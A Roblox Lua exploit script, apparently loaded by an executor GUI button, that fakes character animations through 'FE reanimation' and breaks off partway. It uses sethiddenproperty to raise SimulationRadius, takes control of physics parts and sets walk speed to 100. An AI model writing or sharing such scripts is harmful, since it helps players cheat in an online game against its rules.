RH = reanim.Torso['Right Hip']
LH = reanim.Torso['Left Hip']
Root = reanim.HumanoidRootPart
NECK = reanim.Torso.Neck
NECK.C0 = CF(0,1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
NECK.C1 = CF(0,-0.5,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RJ.C1 = CF(0,-1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RJ.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RS.C1 = CF(0,0.5,0)*ANGLES(RAD(0),RAD(0),RAD(0))
LS.C1 = CF(0,0.5,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RH.C1 = CF(0,1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
LH.C1 = CF(0,1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RH.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
LH.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RS.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
LS.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))

Mode='1'

mousechanger=game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(k)
if k == '1' then-- first mode
Mode='1'
elseif k == 'e' then-- second mode
Mode='2'
elseif k == 'q' then-- first mode again
Mode='1'
end
end)

attacklol=game.Players.LocalPlayer:GetMouse().Button1Down:Connect(function()
Mode='Attack1'
wait(1) -- time of attack u can edit this
Mode='Attack2'
wait(1)
Mode='Attack3'
wait(0.07)
Mode ='1' -- change this mode to whatever u want the mode to be after attacking
end)

coroutine.wrap(function()
while true do -- anim changer
if HumanDied then break end
sine = sine + speed
local rlegray = Ray.new(reanim["Right Leg"].Position + Vector3.new(0, 0.5, 0), Vector3.new(0, -2, 0))
local rlegpart, rlegendPoint = workspace:FindPartOnRay(rlegray, char)
local llegray = Ray.new(reanim["Left Leg"].Position + Vector3.new(0, 0.5, 0), Vector3.new(0, -2, 0))
local llegpart, llegendPoint = workspace:FindPartOnRay(llegray, char)
local rightvector = (Root.Velocity * Root.CFrame.rightVector).X + (Root.Velocity * Root.CFrame.rightVector).Z
local lookvector = (Root.Velocity * Root.CFrame.lookVector).X + (Root.Velocity * Root.CFrame.lookVector).Z
if lookvector > reanim.Humanoid.WalkSpeed then
lookvector = reanim.Humanoid.WalkSpeed
end
if lookvector < -reanim.Humanoid.WalkSpeed then
lookvector = -reanim.Humanoid.WalkSpeed
end
if rightvector > reanim.Humanoid.WalkSpeed then
rightvector = reanim.Humanoid.WalkSpeed
end
if rightvector < -reanim.Humanoid.WalkSpeed then
rightvector = -reanim.Humanoid.WalkSpeed
end
local lookvel = lookvector / reanim.Humanoid.WalkSpeed
local rightvel = rightvector / reanim.Humanoid.WalkSpeed
if Mode == '1' then
if Root.Velocity.y > 1 then -- jump

elseif Root.Velocity.y < -1 then -- fall

elseif Root.Velocity.Magnitude < 2 then -- idle
NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RJ.C0=RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-1+0.1*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RS.C0=RS.C0:Lerp(CFrame.new(1.5+0*math.cos(sine/10),0.5+0.1*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(-9.7+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(-51.44+0*math.cos(sine/10))),.2) 
LS.C0=LS.C0:Lerp(CFrame.new(-1.5+0*math.cos(sine/10),0.5+0.1*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(-9.7+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(51.44+0*math.cos(sine/10))),.2) 
RH.C0=RH.C0:Lerp(CFrame.new(0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0.1*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(5.58+0*math.cos(sine/10))),.2) 
LH.C0=LH.C0:Lerp(CFrame.new(-0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0.1*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(-5.58+0*math.cos(sine/10))),.2)
elseif Root.Velocity.Magnitude > 20 then -- run

elseif Root.Velocity.Magnitude < 20 then -- walk
NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RJ.C0=RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RS.C0=RS.C0:Lerp(CFrame.new(1.5+0*math.cos(sine/10),0.5+0.1*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+-20*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
LS.C0=LS.C0:Lerp(CFrame.new(-1.5+0*math.cos(sine/10),0.5+0.1*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+20*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RH.C0=RH.C0:Lerp(CFrame.new(0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0.1*math.cos(sine/10))*CFrame.Angles(math.rad(0+20*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(5.58+0*math.cos(sine/10))),.2) 
LH.C0=LH.C0:Lerp(CFrame.new(-0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0.1*math.cos(sine/10))*CFrame.Angles(math.rad(0+-20*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(-5.58+0*math.cos(sine/10))),.2)
end

elseif Mode == '2' then
if Root.Velocity.y > 1 then -- jump
elseif Root.Velocity.y < -1 then -- fall
elseif Root.Velocity.Magnitude < 2 then -- idle
NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RJ.C0=RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-1+0.1*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RS.C0=RS.C0:Lerp(CFrame.new(1.5+0*math.cos(sine/10),0.5+0.1*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(13.23+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(-32.62+0*math.cos(sine/10))),.2) 
LS.C0=LS.C0:Lerp(CFrame.new(-1.5+0*math.cos(sine/10),0.5+0.1*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(13.23+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(36.15+0*math.cos(sine/10))),.2) 
RH.C0=RH.C0:Lerp(CFrame.new(0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0.1*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(5.58+0*math.cos(sine/10))),.2) 
LH.C0=LH.C0:Lerp(CFrame.new(-0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0.1*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(-5.58+0*math.cos(sine/10))),.2)
elseif Root.Velocity.Magnitude > 20 then -- run

elseif Root.Velocity.Magnitude < 20 then -- walk
NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RJ.C0=RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-1+0.1*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RS.C0=RS.C0:Lerp(CFrame.new(1.5+0*math.cos(sine/10),0.5+0.1*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(13.23+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(-32.62+0*math.cos(sine/10))),.2) 
LS.C0=LS.C0:Lerp(CFrame.new(-1.5+0*math.cos(sine/10),0.5+0.1*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(13.23+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(36.15+0*math.cos(sine/10))),.2) 
RH.C0=RH.C0:Lerp(CFrame.new(0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0.1*math.cos(sine/10))*CFrame.Angles(math.rad(0+20*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(5.58+0*math.cos(sine/10))),.2) 
LH.C0=LH.C0:Lerp(CFrame.new(-0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0.1*math.cos(sine/10))*CFrame.Angles(math.rad(0+-20*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(-5.58+0*math.cos(sine/10))),.2)
end

elseif Mode == 'Attack1' then --attack clerp 
NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RJ.C0=RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-1+0.1*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RS.C0=RS.C0:Lerp(CFrame.new(1.5+0*math.cos(sine/10),0.5+0.1*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(97.29+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(5.58+0*math.cos(sine/10))),.2) 
LS.C0=LS.C0:Lerp(CFrame.new(-1.5+0*math.cos(sine/10),0.5+0.1*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(13.23+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(36.15+0*math.cos(sine/10))),.2) 
RH.C0=RH.C0:Lerp(CFrame.new(0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0.1*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(5.58+0*math.cos(sine/10))),.2) 
LH.C0=LH.C0:Lerp(CFrame.new(-0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0.1*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(-5.58+0*math.cos(sine/10))),.2)
elseif Mode == 'Attack2' then --attack clerp 
NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RJ.C0=RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-1+0.1*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RS.C0=RS.C0:Lerp(CFrame.new(1.5+0*math.cos(sine/10),0.5+0.1*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(97.29+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(5.58+0*math.cos(sine/10))),.2) 
LS.C0=LS.C0:Lerp(CFrame.new(-1.5+0*math.cos(sine/10),0.5+0.1*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(13.23+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(36.15+0*math.cos(sine/10))),.2) 
RH.C0=RH.C0:Lerp(CFrame.new(0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0.1*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(5.58+0*math.cos(sine/10))),.2) 
LH.C0=LH.C0:Lerp(CFrame.new(-0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0.1*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(-5.58+0*math.cos(sine/10))),.2)
elseif Mode == 'Attack3' then --attack clerp 

end
srv.RenderStepped:Wait()
end
end)()
end)

Window1Section:NewButton("Fe human Car", "idk", function()
    

game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 100

function rmesh(a)
if not (workspace[game.Players.LocalPlayer.Name][a].Handle:FindFirstChild('Mesh') or workspace[game.Players.LocalPlayer.Name][a].Handle:FindFirstChild('SpecialMesh')) then return end
old = game.Players.LocalPlayer.Character
game.Players.LocalPlayer.Character = workspace[game.Players.LocalPlayer.Name]
for i,v in next, workspace[game.Players.LocalPlayer.Name]:FindFirstChild(a).Handle:GetDescendants() do
if v:IsA('Mesh') or v:IsA('SpecialMesh') then
v:Remove()
end
end
for i = 1 , 2 do
game.Players.LocalPlayer.Character=old
end
end

HumanDied = false for i,v in next, game:GetService("Players").LocalPlayer.Character:GetDescendants() do if v:IsA("BasePart") and v.Name ~= 'Torso' and v.Name ~= 'Head' then  _G.netless=game:GetService("RunService").Heartbeat:connect(function() v.AssemblyLinearVelocity = Vector3.new(-30,0,0) sethiddenproperty(game.Players.LocalPlayer,"MaximumSimulationRadius",math.huge) sethiddenproperty(game.Players.LocalPlayer,"SimulationRadius",999999999) end) end end  local plr = game.Players.LocalPlayer local char = plr.Character local srv = game:GetService('RunService') local ct = {}  char.Archivable = true local reanim = char:Clone() reanim.Name = 'Nexo '..plr.Name..'' fl=Instance.new('Folder',char) fl.Name ='Nexo' reanim.Animate.Disabled=true char.HumanoidRootPart:Destroy() char.Humanoid:ChangeState(16)  for i,v in next, char.Humanoid:GetPlayingAnimationTracks() do v:Stop() end char.Animate:Remove()  function create(part, parent, p, r) Instance.new("Attachment",part) Instance.new("AlignPosition",part) Instance.new("AlignOrientation",part) Instance.new("Attachment",parent) part.Attachment.Name = part.Name parent.Attachment.Name = part.Name part.AlignPosition.Attachment0 = part[part.Name] part.AlignOrientation.Attachment0 = part[part.Name] part.AlignPosition.Attachment1 = parent[part.Name] part.AlignOrientation.Attachment1 = parent[part.Name] parent[part.Name].Position = p or Vector3.new() part[part.Name].Orientation = r or Vector3.new() part.AlignPosition.MaxForce = 999999999 part.AlignPosition.MaxVelocity = math.huge part.AlignPosition.ReactionForceEnabled = false part.AlignPosition.Responsiveness = math.huge part.AlignOrientation.Responsiveness = math.huge part.AlignPosition.RigidityEnabled = false part.AlignOrientation.MaxTorque = 999999999 end  for i,v in next, char:GetDescendants() do if v:IsA('Accessory') then v.Handle:BreakJoints() create(v.Handle,reanim[v.Name].Handle) end end  char.Torso['Left Shoulder']:Destroy() char.Torso['Right Shoulder']:Destroy() char.Torso['Left Hip']:Destroy() char.Torso['Right Hip']:Destroy()  create(char['Torso'],reanim['Torso']) create(char['Left Arm'],reanim['Left Arm']) create(char['Right Arm'],reanim['Right Arm']) create(char['Left Leg'],reanim['Left Leg']) create(char['Right Leg'],reanim['Right Leg'])  for i,v in next, reanim:GetDescendants() do if v:IsA('BasePart') or v:IsA('Decal') then v.Transparency = 1 end end  reanim.Parent = fl  table.insert(ct,srv.Heartbeat:Connect(function() char.Torso.CFrame=reanim.Torso.CFrame char.Torso.Velocity=Vector3.new(40000,40000,0) end))  for i,v in next, reanim:GetDescendants() do if v:IsA('BasePart') then table.insert(ct,srv.RenderStepped:Connect(function() v.CanCollide = false end)) end end  for i,v in next, char:GetDescendants() do if v:IsA('BasePart') then table.insert(ct,srv.RenderStepped:Connect(function() v.CanCollide = false end)) end end  for i,v in next, reanim:GetDescendants() do if v:IsA('BasePart') then table.insert(ct,srv.Stepped:Connect(function() v.CanCollide = false end)) end end  for i,v in next, char:GetDescendants() do if v:IsA('BasePart') then table.insert(ct,srv.Stepped:Connect(function() v.CanCollide = false end)) end end  table.insert(ct,reanim.Humanoid.Died:Connect(function() plr.Character = char char:BreakJoints() reanim:Destroy() game.Players:Chat('-gr') _G.netless:Disconnect() HumanDied = true for _,v in pairs(ct) do v:Disconnect() end end))  plr.Character = reanim workspace.CurrentCamera.CameraSubject = reanim.Humanoid

IT = Instance.new
CF = CFrame.new
VT = Vector3.new
RAD = math.rad
C3 = Color3.new
UD2 = UDim2.new
BRICKC = BrickColor.new
ANGLES = CFrame.Angles
EULER = CFrame.fromEulerAnglesXYZ
COS = math.cos
ACOS = math.acos
SIN = math.sin
ASIN = math.asin
ABS = math.abs
MRANDOM = math.random
FLOOR = math.floor

speed = 1
sine = 1
srv = game:GetService('RunService')

reanim = game.Players.LocalPlayer.Character

function hat(h,p,c1,c0,m)
reanim[h].Handle.AccessoryWeld.Part1=reanim[p]
reanim[h].Handle.AccessoryWeld.C1=c1 or CFrame.new()
reanim[h].Handle.AccessoryWeld.C0=reanim[h].Handle.AccessoryWeld.C0:Lerp(c0 or CFrame.new(),1)
if m == true then
rmesh(h)
end
end

m = game.Players.LocalPlayer:GetMouse()
RJ = reanim.HumanoidRootPart.RootJoint
RS = reanim.Torso['Right Shoulder']
LS = reanim.Torso['Left Shoulder']
RH = reanim.Torso['Right Hip']
LH = reanim.Torso['Left Hip']
Root = reanim.HumanoidRootPart
NECK = reanim.Torso.Neck
NECK.C0 = CF(0,1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
NECK.C1 = CF(0,-0.5,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RJ.C1 = CF(0,-1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RJ.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RS.C1 = CF(0,0.5,0)*ANGLES(RAD(0),RAD(0),RAD(0))
LS.C1 = CF(0,0.5,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RH.C1 = CF(0,1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
LH.C1 = CF(0,1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RH.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
LH.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RS.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
LS.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))



coroutine.wrap(function()
while true do -- anim changer
if HumanDied then break end
sine = sine + speed
local rlegray = Ray.new(reanim["Right Leg"].Position + Vector3.new(0, 0.5, 0), Vector3.new(0, -2, 0))
local rlegpart, rlegendPoint = workspace:FindPartOnRay(rlegray, char)
local llegray = Ray.new(reanim["Left Leg"].Position + Vector3.new(0, 0.5, 0), Vector3.new(0, -2, 0))
local llegpart, llegendPoint = workspace:FindPartOnRay(llegray, char)
local rightvector = (Root.Velocity * Root.CFrame.rightVector).X + (Root.Velocity * Root.CFrame.rightVector).Z
local lookvector = (Root.Velocity * Root.CFrame.lookVector).X + (Root.Velocity * Root.CFrame.lookVector).Z
if lookvector > reanim.Humanoid.WalkSpeed then
lookvector = reanim.Humanoid.WalkSpeed
end
if lookvector < -reanim.Humanoid.WalkSpeed then
lookvector = -reanim.Humanoid.WalkSpeed
end
if rightvector > reanim.Humanoid.WalkSpeed then
rightvector = reanim.Humanoid.WalkSpeed
end
if rightvector < -reanim.Humanoid.WalkSpeed then
rightvector = -reanim.Humanoid.WalkSpeed
end
local lookvel = lookvector / reanim.Humanoid.WalkSpeed
local rightvel = rightvector / reanim.Humanoid.WalkSpeed
if reanim.Humanoid.Jump then -- jump
NECK.C0 = NECK.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RJ.C0 = RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RS.C0 = RS.C0:Lerp(CFrame.new(1.5+0*math.cos(sine/10),0.5+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(180+0*math.cos(sine/10)),math.rad(36.15+0*math.cos(sine/10)),math.rad(-2.06+0*math.cos(sine/10))),.2) 
LS.C0 = LS.C0:Lerp(CFrame.new(-1.5+0*math.cos(sine/10),0.5+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(180+0*math.cos(sine/10)),math.rad(-36.15+0*math.cos(sine/10)),math.rad(-2.06+0*math.cos(sine/10))),.2) 
RH.C0 = RH.C0:Lerp(CFrame.new(0.5+0*math.cos(sine/10),0.1+0*math.cos(sine/10),-0.68+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
LH.C0 = LH.C0:Lerp(CFrame.new(-0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2)
elseif Root.Velocity.y < -1 and reanim.Humanoid.Jump then -- fall
NECK.C0 = NECK.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RJ.C0 = RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RS.C0 = RS.C0:Lerp(CFrame.new(1.5+0*math.cos(sine/10),0.5+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(180+0*math.cos(sine/10)),math.rad(36.15+0*math.cos(sine/10)),math.rad(-2.06+0*math.cos(sine/10))),.2) 
LS.C0 = LS.C0:Lerp(CFrame.new(-1.5+0*math.cos(sine/10),0.5+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(180+0*math.cos(sine/10)),math.rad(-36.15+0*math.cos(sine/10)),math.rad(-2.06+0*math.cos(sine/10))),.2) 
RH.C0 = RH.C0:Lerp(CFrame.new(0.5+0*math.cos(sine/10),0.1+0*math.cos(sine/10),-0.68+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
LH.C0 = LH.C0:Lerp(CFrame.new(-0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2)
elseif Root.Velocity.Magnitude < 2 then -- idle
NECK.C0 = NECK.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RJ.C0 = RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RS.C0 = RS.C0:Lerp(CFrame.new(1.5+0*math.cos(sine/10),0.5+0.2*math.cos(sine/21),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(-21+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
LS.C0 = LS.C0:Lerp(CFrame.new(-1.5+0*math.cos(sine/10),0.5+0.2*math.cos(sine/21),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(21+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RH.C0 = RH.C0:Lerp(CFrame.new(0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(-25+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
LH.C0 = LH.C0:Lerp(CFrame.new(-0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(25+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2)
elseif Root.Velocity.Magnitude < 20 then -- walk
NECK.C0 = NECK.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RJ.C0 = RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-1.76+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(-90+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RS.C0 = RS.C0:Lerp(CFrame.new(1.5+0*math.cos(sine/10),0.5+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+1280*math.cos(sine/50)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
LS.C0 = LS.C0:Lerp(CFrame.new(-1.5+0*math.cos(sine/10),0.5+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+1280*math.cos(sine/50)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RH.C0 = RH.C0:Lerp(CFrame.new(1.5+0*math.cos(sine/10),-0.68+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+1280*math.cos(sine/50)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
LH.C0 = LH.C0:Lerp(CFrame.new(-1.5+0*math.cos(sine/10),-0.68+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+1280*math.cos(sine/50)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2)
elseif Root.Velocity.Magnitude > 20 then -- run
NECK.C0 = NECK.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RJ.C0 = RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-1.76+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(-90+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RS.C0 = RS.C0:Lerp(CFrame.new(1.5+0*math.cos(sine/10),0.5+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+1280*math.cos(sine/50)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
